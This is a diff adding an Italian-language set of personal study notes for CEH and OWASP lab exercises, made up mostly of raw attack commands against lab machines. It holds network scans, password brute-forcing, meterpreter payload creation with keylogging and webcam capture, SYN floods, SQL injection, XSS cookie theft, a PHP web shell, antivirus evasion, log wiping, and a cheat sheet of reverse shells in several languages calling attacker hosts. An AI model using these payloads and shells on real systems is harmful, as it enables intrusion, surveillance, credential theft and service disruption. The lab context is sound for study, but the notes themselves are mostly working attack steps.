@@ -1,0 +1,1152 @@
+CEH 
+nmap -sS -O 192.168.0.1 192.168.0.4 
+
+nmap -sP 192.168.0.0/24
+
+nikto -host http://192.168.0.10
+
+nmap -sn 192.168.0.0/24
+
+nmap --traceroute 192.168.0.0/24
+
+nmap 192.168.0.1-4
+
+nmap 192.168.0.*
+
+nmap -PR 192.168.0.0/24
+
+nmap -p 80 192.168.0.0/24
+
+nmap -sn -PS80 192.168.0.0/24
+
+nmap 192.168.0.2
+
+nmap -p 1-100 192.168.0.1
+
+nmap -F 192.168.0.1
+
+nmap -p- 192.168.0.1
+
+nmap -sT 192.168.0.1
+
+nmap -sU -p 53,80,3389 192.168.0.1
+
+nmap -O --osscan-limit 192.168.0.0/24
+
+nmap -O --osscan-guess 192.168.0.3
+
+nmap -A 192.168.0.6
+
+nmap -sV -O 192.168.0.1
+
+//////
+https://hunter.io
+(cerca informazioni attraverso email address) 
+
+https://burrrd.com
+(estrae informazioni attraverso Twitter)
+
+nslookup practicelabs.com
+
+nslookup -type=A practicelabs.com
+
+nslookup -type=soa practicelabs.com
+
+nslookup -type=A -debug practicelabs.com
+
+nslookup -query=MX practicelabs.com
+
+nslookup -type=ns practicelabs.com
+
+nslookup practicelabs.com 192.168.0.1
+
+nslookup -query=any practicelabs.com
+
+theharvester -d practice-labs.com -l 500 -b google
+
+theharvester -d theguardian.com -b pgp
+
+http://www.anywho.com
+
+------------------
+
+idserve.exe
+(fa query particolari) 
+
+csports.exe 
+(guess what he do) 
+
+Mylanviewer-setup.exe
+(una specie di nmap ma grafico un pò alla zenmap )
+
+hping3 192.168.0.1 --icmp
+(lo sappiamo tutti cosa fa)
+
+hping3 192.168.0.1 --icmp -c 5
+(ne raccoglie 5 pacchetti icmp) 
+
+hping3 intranet --scan 80 -S
+
+hping3 intranet --scan 22,80,443 -S
+
+hping3 192.168.0.1 --scan 1-65535 -S
+(-S sta per settare il SYN flag) 
+
+hping3 -8 0-100 -S 192.168.0.1
+(-8 per attivare lo SCAN mode)
+
+dmitry 
+(tool utilizzato per il gathering di informazioni whois e trovare sottodomini)
+
+
+dmitry -p intranet 
+(porte disponibili per lo scan) 
+
+dmitry -p intranet -o plab 
+(sarebbe come fare un nmap &) 
+
+cat plab.txt 
+
+nc -nvz 192.168.0.1 88
+(-n per utilizzare quell' ip -z per effettuare lo scanning)
+
+netdiscover -r 192.168.0.0/24
+(tools utilizzare per lo scanning)
+
+netdiscover -p
+
+
+fping 192.168.0.1
+(controlla se l' ip è vivo or not) 
+
+fping -g 192.168.0.1 192.168.0.2 
+(-g sta per il gruppo)
+
+fping -g 192.168.0.0/24
+
+-------------------------
+(effettuare uno scanning attraverso metaesploit)
+msfconsole 
+use auxiliary/scanner/portscan/syn 
+set RHOSTS 192.168.0.1
+set THREADS 25 
+set PORTS 53
+run
+----
+
+set PORTS 1-100
+run 
+
+--
+set RHOSTS 192.168.0.1-3
+run
+
+-------------
+
+superscan4.1
+(viene usato per l'enumerazione di Windows)
+
+(Poweshell Admin)
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+(turn off the firewall policies) 
+
+hyena.zip 
+(usato per aggiungere domini e l'enumerazione del dominio)
+
+---LDAP Enumeration 
+ldapadmin-4.12
+(aggiungere il dominio e inserire all'utente i privilegi)
+
+---SNMP Enumeration
+Solarwinds DesktopToolSet
+
+Windwos aDminitstrative tOOLS--> Services --> SNMP
+
+MIB Viewer --> compila i campi 
+
+
+---
+host -t mx practicelabs.com
+
+echo www > plab.txt
+echo ftp >> plab.txt
+echo mail >> plab.txt
+echo proxy >> plab.txt
+
+for ip in $(cat plab.txt); do host $ip.practicelabs.com;done
+ 
+dnsenum practicelabs.com
+(enum attraverso il dns) 
+
+nmap 192.168.0.10 --script smb-os-discovery.nse
+(nmap script nse attraverso smb) 
+
+rpcclient 192.168.0.3 -U admin
+(inseriamo la password che abbiamo rimpostato attraverso ldap enum) 
+
+>srvinfo
+>enumprivs 
+>lsaenumsid
+
+(ricordiamo che funziona se windows firewall è spento ) 
+
+--enumeration preventing techinques
+Kali:
+wafw00f http://intranet
+
+waf
+
+win 10:
+group policy managemente --> domains --> edit --> computer configuration --> Policies --> Windows Settings --> Security Settings --> Account Lockout Policy --> modificare i valori 
+
+DNS Enumaration 
+DNS --> proprieties --> security 
+
+Prevent Windows Enumeration:
+services.msc --> cerca Print Spooler --> e metterlo a stop (status) e cambiare lo startup type in disabled 
+
+----Perfoming Online Password Attacks 
+kali:
+
+cewl -w test.txt -d -m 3 intranet
+
+apt-get install hydra 
+
+hydra -t 5 -V -f -l bee -P plab.txt 192.168.0.10 ftp
+(plab.txt file delle wordlist scritto da noi) 
+
+unshadow /etc/passwd /etc/shadow > pass
+john pass
+
+win7:
+cain and abel--> open file location --> 2x winrtgen --> genera la tabella che utilizza per il brute force 
+
+2x cain --> crackers --> NTML hashes --> prima opzione --> compila e start 
+
+kali:
+msfvenom -l payloads
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.4 -f exe -o payload.exe
+
+python -m SimpleHTTPServer
+
+win:
+http://192.168.0.10:8000/payload.exe
+
+kali:
+avviamo metasploit 
+
+use multi/handler
+
+set payload windows/meterpreter/reverse_tcp 
+
+show options
+
+set LHOST 192.168.0.4 
+
+exploit 
+-------
+sono dentro uwu
+
+getuid 
+getsystem
+shell
+
+net users
+
+net user /add plabuser Test*
+
+net localgroup administrators plabuser /add
+
+exit 
+
+clearv
+(cancellare le tracce)
+
+--------create fork bomb 
+notepad --> %0|%0
+
+cmd --> cd Desktop --> dir --> forkbomb.bat 
+
+--controllare porte aperte 
+
+netstat -an 
+
+--track port usage 
+TCPview.exe 
+
+-- netcat to perform port redirection 
+win10 macchina 1
+scaricare nmap-6.47.exe
+ncat -l -p 8080
+
+win10 macchina2
+scaricare nmap-6.47.exe
+ncat 192.168.0.3 8080 -e "cmd.exe" 
+hostname
+ipconfig
+
+---sniffing 
+changemac_setup.exe
+(ti permette di mascherare/cambiare indirizzo MAC) 
+
+SMAC
+(ti permette di effettuare lo spoofing di MAC)
+
+Wireshark
+(fileter sulla porta 192.168.0.1 )
+
+Sniff-O-Matic 
+(identico a wireshark )
+
+Attacchi DDoS
+----perform a SYN Flood Attack
+hping3 -S 192.168.0.3 -a 192.168.0.4 -p 22 --flood
+
+---perform a ICMP Flood Attack 
+hping3 -c 100 --icmp 192.168.0.3
+
+---perform a Ping of death attack 
+ping 192.168.0.3 -t -l 65500
+
+---Perform an SYN Floor Attack Using Metasploit Framework
+msfconsole 
+use auxiliary/dos/tcp/synflood
+SET RHOST 192.168.0.3
+set SHOST 192.168.0.10 
+(host da spoofare)
+set TIMEOUT 50000
+exploit 
+
+--Session Hijacking 
+
+Burp (proxy utilizzato per il red teaming principalemente)
+
+---Exploiting Webserver vulnerabilities 
+kali
+apt-get install perl 
+git clone https://github.com/llaera/slowloris.pl
+cd slowloris.pl
+perl slowloris.pl -dns 192.168.0.10 
+
+win10
+http://192.168.0.10/
+
+--Enumerate WebServer using HTTPrint
+httprint.exe 
+
+host:192.168.0.10
+port 80
+
+done
+
+siti da avere sotto d'occhio
+https://pentest-tools.com/home
+
+---skipfish perform webserver recoinnaissance
+
+skipfish -o /root/Desktop/plab http://192.168.0.10/bWAPP
+
+firefox /root/Desktop/plab/index.html
+
+---find webserver grazie metaesploit
+
+use auxiliary/scanner/http/http_version
+
+set RHOSTS 192.168.0.10
+
+set THREADS 10
+
+run
+
+--check webDAV on WebServer usando metaesploit 
+
+use auxiliary/scanner/http/webdav_scanner
+
+set RHOSTS 192.168.0.10
+
+set THREADS 10
+
+run
+
+--Prevenire i webserver exploit 
+win10:
+iis --> selezionare il server --> Request Filtering --> HTTP Verbs --> deny verb --> TRACK --> (fare la stessa cosa con TRACE)
+
+Web Application Password Cracking 
+
+togliere il proxy sul browser che andiamo a utilizzare 
+ettercap -T | grep password  
+(sniffing delle password) 
+
+--accediamo con le credenziali 
+
+Cracking delle password attraverso Medusa 
+
+(fatto delle wordlist <plab.txt> dove abbiamo inserito bee) 
+
+medusa -h 192.168.0.10 -u bee -P plab.txt -M ftp
+
+medusa -h 192.168.0.10 -u bee -P plab.txt -M ssh
+
+medusa -h 192.168.0.10 -U user.txt -p bug -M ssh
+
+medusa -h 192.168.0.10 -U user.txt -P plab.txt -M ftp
+
+-----
+attraverso win10:
+
+192.168.0.10/solitosito
+
+bee 
+bug
+
+broken authentication -- insecure login forms ---> hack 
+View Source (easy)
+
+broken authentication -- Session Management -- Administrative Portals --> hack 
+
+all' interno dell' URL c'è un indizio su admin= 0 cambiando il valore di 1.. si passa la challenge 
+
+--ispeziona il session ID all' interno della URL 
+Session Management -- Session ID in URL --> Hack 
+
+l'ID è letteralmente nella URL xD 
+
+---condurre un OS Command Injection Attack 
+
+c'è un DNS lookup --> |hostname (bee-box) --> |net user (nobody bee)
+
+DNS lookup --> |whoami (www-data) --> |pwd (/var/www/bWAPP) 
+--> |cat /etc/passwd 
+
+--SSI Perfom Server-side 
+
+plab 
+user
+
+<script>alert("Hacked")</script>
+
+user
+
+
+<script>alert(document.cookie)</script>
+user
+
+<!--#echo var="DOCUMENT_NAME" -->
+plab
+
+
+<!--#echo var="DOCUMENT_URI" -->
+plab
+
+XSS -Reflected (GET)
+
+Plab
+User 
+
+<script>alert('Hacked')</script>
+
+User
+
+Cross-Site Scripting - Stored (Blog) --> Hack 
+
+Welcome to the PLAB blog! --> Submit 
+
+<script>alert('Hacked')<scritp>
+
+XSS Cross-site Scripting HREF Attack 
+
+PLAB --> Continue 
+
+rimpiazzare nell' url al posto di PLAB -- >  ><scritp>alert(1)</script><
+
+DONE  
+
+SQL Injection --> Get/Search --> Hack 
+
+cliccando subito il tasto mostrano tutti i risultati
+ 
+m'
+
+m' order by 1-- -
+
+m' union all select 1,2,3,4,5,6,7 -- -
+
+m' union all select 1,database(),3,4,5,6,7 -- -
+
+m' union all select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=database() -- -
+
+m' union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users' and table_schema=database() -- -
+
+m' union all select 1,login,password,secret,5,6,7 from users -- -0
+
+SQL Injection --> Blind Boolean Based --> Hack 
+
+test’ or substring(@@version,1,1)=4#
+
+test’ or substring(database(),1,1)=’b’#
+
+--bypassare il website login usando sql injection
+
+http://demo.testfire.net/bank/main.aspx
+
+admin
+
+'or '1'='1
+
+--Webcruiser to detect sql Injection
+
+URL:http://192.168.0.10/bWAPP/sqli_1.php?title=&action=Search
+
+Settings --> Scan --> Done --> ScanSite
+
+Hacking Wireless Networks Introduction
+
+netsh wlan show networks mode=bssid
+
+per vedere il bssid uwu
+
+---Cryptography
+
+md5calculator
+(per decryptare le cartelle)
+
+aep.msi
+(per encryptare le cartelle)
+
+hashcalc
+(inserisci il software all' interno della cartella attraverso questo ti calcola l'hash possibilmente da analizzare attraverso Virus total 
+)
+
+full disk encryption 
+(software che agisce praticamente come bitlocker)
+
+--Social Engineer 
+kali:
+
+setoolkit
+1
+4
+5
+<ip>
+443
+yes
+
+msfconsole
+use auxiliary/server/ftp
+exploit
+
+win10:
+cmd--> ftp 192.168.0.4--> anonymous --> ok --> dir --> binary --> get payload.exe 
+
+aprire il payload.exe
+
+kali:
+session -i 1
+ps
+getsystem
+webcam_snap
+exit
+clear
+exit -y
+
+---social engineering using a cloned website
+kali:
+setoolkit
+1
+2
+3
+1
+<ip> 
+3
+
+win:
+192.168.0.4
+inserire le credenziali di twitter 
+
+kali:
+ottenuto le credenziali inserite della macchina win
+
+--Preventing Social Engineer 
+Netcraft extension da scaricare su Firefox 
+
+--Vulnerability Analysis 
+kali:
+
+nikto -host <ip> 
+
+nikto -host http://192.168.0.10 -o plab.html
+
+firefox plab.html
+
+apt-get install python-pip -y
+
+apt-get install openvas 
+
+openvas-setup
+
+win10:
+installare il MBSA (microsoft baseline Security Analyzer) 
+(scan alla nmap ma casa microsoft)
+
+compmgmt.msc
+(controllare utenti attaverso gli user)
+
+--Evading Firewall 
+Zone Alarm Antivirus
+
+win10:
+run--> mstsc --> accedere 
+
+bypass Blocked Sites 
+https://www.proxfree.com
+(sito per evadere usando un server proxy) 
+
+www.google.co.uk
+
+--Steganografia
+
+copy /b “PLAB.png”+PLAB.zip PLAB-new.png
+
+7-zip File Manager
+
+
+Kali:
+apt-get install steghide -y
+
+mkdir plab
+
+cd plab
+
+touch secret.txt
+
+cp ~/Pictures/practice-labs.jpg ~/plab
+
+ls -l
+
+steghide embed -cf practice-labs.jpg -ef secret.txt
+
+inserire la password
+
+steghide extract -sf practice-labs.jpg
+
+Win:
+SilentEye
+(software adatto per la steganografia)
+
+zenmap oltre ad effettuare un semplice nmap effettua anche la topologia della rete 
+
+Manage OpManager 
+networking-monitor tool abbastanza faigo 
+
+---Backdoor
+win8:
+
+tftp
+
+
+mettiamo l'eseguibile sul Desktop
+
+cmd --> Cd Desktop --> PSExec \\PLABWIN10 cmd
+hostname
+
+dism /online /Enable-Feature /FeatureName:TFTP
+
+tftp 192.168.0.5 GET ncat.exe 
+
+done
+
+creazione di un IPSec per FTP 
+
+Administrative Tools --> local security policy --> Security Settings --> IP Security Policies on Local Computer --> tasto destro (Create IP Security Policy) *compila*
+
+Add--> all connections --> add filter List --> next --> any ip address --> TCP --> port 21 --> done 
+
+add filter Action --> next ---> negotiate security --> dont allow --> done 
+
+use this string --> finish --> ok DONE  
+
+tasto destro sulla cartella --> assign the IPSec 
+
+--Backup of preconfigured IPSec Policies 
+
+run --> secpol.msc 
+
+tasto destro IPSec Policies --> All Tasks --> Export Policies --> salvare policies 
+
+Configure Security Association rule in Windows Firewall with Advanced Secuirty in MMC 
+
+Administrative Tools ---> Widows Firewall with Advanced Secuirty --> Connection Security Rules --> New Rule 
+
+Server-to-Server --> next --> Seconda opzione --> next --> Advanced --> Add --> preshared key (test@123) --> done 
+
+---Performing Offline Attack 
+
+hyper-V 
+installare kali ma in modalità forensic --> computer --> windows--> system32 --> config --> controllare il file SAM con il terminale (cd /media/root/44.../system32/config --> pwdump SYSTEM SAM )
+
+copiare il contenuto del file --> inserirlo in un file 
+
+
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt tocrack.txt
+
+FATTO 
+
+social engineer attack 
+
+kali:
+setoolkit
+1
+4
+5
+192.168.0.3
+443
+yes
+
+msfconsole
+use auxilary/server/ftp
+set FTPROOT /root/.set/
+exploit 
+
+win10:
+cmd --> ftp 192.168.0.3 --> anonymous --> invio --> dir --> binary --> get payload.exe --> quit 
+
+rinomina in setup.exe --> doppio click 
+
+kali:
+sessions -i 1 
+ps 
+getsystem 
+webcam_snap
+keyscan_start 
+keyscan_dump 
+background 
+
+-- Malware Analysis 
+IDA 
+(sappiamo già cosa fa) 
+
+Stinger
+(usato per rimuovere alcuni virus specifici) 
+
+UnHackMe, the Anti-Rootkit Tool
+(multipurpose malware removal application)
+
+--Firewall ACL Rule Creation 
+Tools -->  Firewall ACL Rules -->  change rules for : 
+Ios Standard 
+
+--Applicare un ACL (netsh)
+
+powershell:
+
+netsh firewall add portopening udp 52780 Wireshark DISABLE CUSTOM 192.168.0.10
+
+netsh firewall add portopening udp 53 Wireshark DISABLE CUSTOM 192.168.0.1
+
+netsh firewall add portopening udp 53 Wireshark DISABLE
+
+
+---Resetting Windows Firewall:
+trinity-rescue-kit.3.4-build-372.iso
+(tool usato per resettare il windows password ) 
+
+--Cracking Kerberos 
+win xP:
+Tiger VNC Viewer 
+
+kali:
+nmap -v -sS -O 192.168.0.6
+msfconsole
+use exploit/windows/smb/ms08_067_netapi
+set RHOST 192.168.0.6
+exploit
+
+--crackare la password dell' amministratore 
+meterpeter>load mimikatz 
+
+(Mimikatz is a tool used to extract plain text passwords, hashes, PIN codes, and so on from the device memory.)
+
+meterpreter> kerberos
+
+SQL Injection
+admin';#
+admin' or 1=1;#
+admin' union select 1, username, password, 4, 5, 6, 7 from accounts;#
+
+OWASP
+
+SQL Injection DNS Lookup
+dnslookup multilliade; id 
+
+Broken Authentication 
+
+creare un utente con sempre student 
+check dei cookies utilizzare quelli search mutilliade 
+edit gli uid dei cookies da 24 assegniamo 1 così da avere i permessi di root 
+
+Sensitive Data Exposure
+
+nikto -host http://mutillidae/mutillidae
+
+poi siamo andati su http://mutillidae/mutillidae/robots.txt
+
+dirbuster --> http://mutillidae
+
+http://mutillidae/mutillidae/passwords
+
+SQL Injection --> SQLi Extract Data --> User Info 
+
+' 
+
+Sensitive Data Exposure --> Information Disclosure --> HTML/JavaScript Comments 
+
+View Page Source --> attraverso i commenti si trova la password
+
+XML External Entities 
+
+XML Validator: <?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE example [
+<!ELEMENT attack ANY >
+<!ENTITY xxe SYSTEM "/etc/passwd" >
+]>
+<attack>&xxe;</attack>
+
+Broken Access Control 
+
+la pagina di login ha al suo interno =/login.php cambiamo all suo interno quel =login.php con =/etc/passwd
+
+OWASP 2017 -> A5 - Broken Access Control-> Insecure Direct Object References -> Source Viewer 
+
+text-file-viewer.php 
+
+Avvio Burp
+
+cambiare cookie inserendo come proxy Burp --> ricliccare il tasto text-file-viewer 
+
+Burp --> Proxy --> Intercept (hot stuff inside) --> cambiare da text-file-viewer a classes/MySQLHandler.php e poi cliccare forward 
+
+OWASP 2017 -> A5 - Broken Access Control-> Missing Function Level Access Control -> Client-side Control Challenge menu item
+
+cambiare gli input id a disabled e cancellare l'intero name input nella sezione input id="id_disabled_textbox"
+
+id_checkbox disabled = "disabled" 
+
+nella sezione Secured by JavaScript 
+cancellare il metodo all' interno 
+
+poi modificare pattern="[a-zA-z]" nella search Box 
+
+email control pattern= "[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$"
+
+nella sezione File Upload 
+inserire type="file" 
+
+nella sezione Number 
+inserire max="999" 
+
+nella sezione id-client-side-control-challenge-form-div 
+inserire all' interno del from id onsubmit="return onSubmitOfForm(this);"
+
+DOpo tutto questo mettere di nuovo burp intercept On e poi cliccare Submit e Forward 
+
+Security Misconfiguration 
+
+http://mutillidae/mutillidae/includes/
+
+OWASP 2017 -> A6 - Security Misconfiguration -> Method Tampering (GET for POST) -> Poll Question menu item
+
+Burp --> assicurati sia intercept on 
+
+scegliere la voce kimset --> inserire signature --> controllare la voce HTTP History di Burp --> mandare la richiesta al Reapeter --> Repater --> Change request method --> cambiare la voce kimset in telnet e poi andare su Go (effutando così 2 richieste sia kimset e telnet) 
+
+
+OWASP 2017 -> A6 - Security Misconfiguration -> Unrestricted File Upload menu item.
+
+creare un file
+echo '<?php system($_GET["cmd"]); ?>' > Desktop/backdoor.php
+  	
+ed uploadarlo 
+(il sito ti dice dove sta il file uploadato) 
+
+andare sull' url dei file uploadati and we are in 
+
+Cross Site Scripting 
+
+OWASP 2017 -> A7 - Cross Site Scripting (XSS) -> Reflected (First Order) -> Password Generator menu item.
+
+cambiare l'user dell' url da anonymous a qwerty 
+
+View Page Source --> cerchiamo la stringa qwerty e sostiuiamo l'intera riga con:
+
+document.getElementById("idUsernameInput").innerHTML = "This password is for qwerty.";
+alert("Malicious Javascript");
+var testxyz="test";
+
+XSS Persistent 
+
+creiamo un utente victim su Chrome e facciamo lo stesso procedimento su attacker 
+
+Firefox:
+Open the Add To Your Blog page, by navigating to the OWASP 2017 -> A7 - Cross Site Scripting (XSS) -> Persistent (Second Order) -> Add to your blog menu item.
+
+Hello from Attacker.<script>document.write("<img src=http://localhost:4444/"+encodeURI(document.cookie)+">");</script>
+
+nc -lvp 4444
+
+Chrome:
+Open the "View Blogs" page by navigating to the OWASP 2017 -> A7 - Cross Site Scripting (XSS) -> Persistent (Second Order) -> View someone's blog menu item.
+
+sul menù a tendina eseguiamo un click sulla voce attacker 
+
+attraverso esso abbiamo ottenuto sul terminale il session ID dell' utente di Chrome 
+
+andiamo su Firefox e modifichiamo il session id nostro con quello di firefox + anche l' uid 
+
+Use XSS to Hook a Browser 
+
+sudo xss-beef 
+
+autenticazione beef (beef - beef) 
+copiare l'esempio ed inserirlo sulla voce del blog di :
+OWASP 2017 -> A7 - Cross Site Scripting (XSS) -> Persistent (Second Order) -> Add to your blog menu item.
+
+poi chiudere la tab di firefox e attivare quella di chrome
+
+attraverso chrome avendo la sessione ancora della vittima dobbiamo vedere le entries del blog di attacker (step descritto prima ) 
+
+beef su chrome --> Commands --> Persistence --> Man in the Browser --> Execute 
+
+Insecure Deserialization 
+
+mutillidae/deserialize.php
+
+click su hi --> modificare la stringa print hi in phpinfo() nella riga 10 ed effettuare la stessa cambiando la riga 10 da riga 13 però modificando il comando in system("id")
+
+ 
+
+
+OWASP Using Components with known vulnerabilities 
+
+nikto -host mutillidae
+
+wget mutillidae/robots.txt -O- 2>/dev/null
+
+wget mutillidae/cgi-bin/status.cgi -O- 2>/dev/null
+
+sudo msfconsole 
+
+search shellshock 
+
+use auxiliary/scanner/http/apache_mod_cgi_bash_env
+
+set RHOSTS mutillidae
+set TARGETURI /cgi-bin/status.cgi
+
+run
+
+whoami
+
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+
+set RHOST mutillidae
+set TARGETURI /cgi-bin/status.cgi
+
+set PAYLOAD linux/x86/shell_reverse_tcp
+
+set LHOST 192.168.1.50
+
+
+run 
+
+sessions -i 1
+
+OWASP Insufficient Loggin and Monitoring 
+
+cat login.txt (login fallimentare )
+
+hydra -f -l admin -P /usr/share/wordlists/rockyou.txt mutillidae http-post-form "/mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:Password incorrect"
+
+OWASP Capstone
+
+Burp
+
+vshephere utilizzato per le VM
+
+bypasshyperion 
+(ti permette di bypassare l'antivirus in questo caso si potrebbe usare anche un payload di msfconsole/msfvenom per bucare una macchina)
+
+wine ../hyperion.exe ../<nome del payload radmin.exe> bypasshyperion.exe 
+
+wine /usr/share/windows-binaries/hyperion/hyperion.exe /root/Desktop/Files/payloadfighissimo.exe /root/Desktop/Files/payloadfighissimohyperion.exe 
+(encoder non tanto buono sarebbe meglio sceglierne uno customizzabile)
+
+wine64 /root/Downloads/PEScrambler.exe -i payloadfighissimohyperion.exe -o payloadPEScrambler.exe
+(un pelino meglio) 
+
+
+meterpeter>clearev (cancella le tracchie)
+
+shred -zu /root/.bash_history
+(cancellare le tracce su linux)
+
+in base allo stack noi possiamo integrare il buffer overflow
+
+-ESP inzio stack  
+-EIP punta all' istruzione successiva da eseguire possiamo manipolarlo e puntare ad un altro esp  
+-EBP fine stack 
+
+Immunity Debugger + mona plugin 
+
+github.com/corelan/mona
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5900
+
+modificare pocbo.py 
+
+/usr/share/metasploit-framework/tools/pattern_offset.rb -q <numero generato sul ESP Immunity Debugger> 
+(fa al query sull' offset in modo da individuare al riga dove inserire una reverse shell )
+
+output: <numero>
+
+generiamo il payload (cattura su discord, inseriamo il payload nel nostro file python e successivamente lo decodiamo codice su discord) 
+
+nc -nvlp 1234
+
+NB: /usr/bin/chsh viene utilizzato per cambiare la password 	
+
+il nostro obbiettivo è manipolare l' EIP e mandarlo all' istruzione del kernerl/libreria.dll e saltare le istruizioni ASLR (deve essere buono)
+
+locate nasm_shell 
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+>jmp esp 
+<output 
+
+https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123
+(linux privilege escaltion check) 
+
+Inline 
+il payload che contiene la shell code e l'exploit 
+
+stager
+lavora con altri payload e forniscono una comunicazione con l'attaccante e la vittima 
+
+meterpreter
+lo sappiamo già
+
+passiveX
+payload che può aiutare a passare alcune regole restrittive dei firewall e lo fa utilizzando il controllo della ActiveX
+che creano un istanza segreta su Internet Explorer 	
+
+NONX
+NX bit è una funzionalità integrate in alcune CPU per impedire l'esecuzione del codice in alcune aree della memoria. Il NONX è fatto per passare il DEP (Data Execution Prevention)
+
+ORD
+Windows stager funionano su ambiente windows e non è necessario esplicitare l' indirizzo del destination address.sono piccolissimi ma è meno stabile degli altri stagere gira su ws2_32.dll che è un processo eseguito prima dell' exploit 
+
+IPV6
+payload su IPV6
+
+Reflective DLL 
+è una tecnica dove uno stage payload inietta all' host compromesso un processo che gira in memoria senza toccare l'hdd (VNC e Meterptreter sono DLL Injection) 
+
+
+brute forcing http directories and files with dirsearch 
+
+./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $targetip -e php
+
+Reverse Shell tanta roba fatte con diversi linguaggi di programmazione 
+
+Bash:
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+Perl:
+perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+Python:
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+PHP: 
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+Ruby:
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+Netcat con -e :
+nc -e /bin/sh 10.0.0.1 1234
+
+Netcat senza -e:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+
+Java:
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+Windows Reverse Shell:
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+aggiungere un utente al dominio:
+net user $username $password /add 
+
+Aggiungere "Remote Desktop Users":
+net localgroup "Remote Desktop Users" $username /add
+
+Fare amministratore un utente:
+net localgroup administrators $username /add
+
+Disabilitare il Windows firewall alle nuove versioni:
+NetSh Advfirewall set allprofiles state off
+
+Disabilitare Windows Firewall alle versioni precedenti:
+netsh firewall set opmode disable
+
+HTTP(s)
+root@kali# python -m SimpleHTTPServer 80
+wget http://attackerip/file
+
+oppure:
+curl http://attackerip/file > file
+
+----------------------
+File to transfer:
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET", strURL, False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+
+utilizzando lo script sarà una roba così:
+cscript wget.vbs http://attackerip/evil.exe evil.exe
+
+Potenziare una reverse shell:
+python -c "import pty; pty.spawn('/bin/bash')"
+
+stty raw -echo
+fg
+
+stty size
+
+stty 
+-rows 48 -columns 120
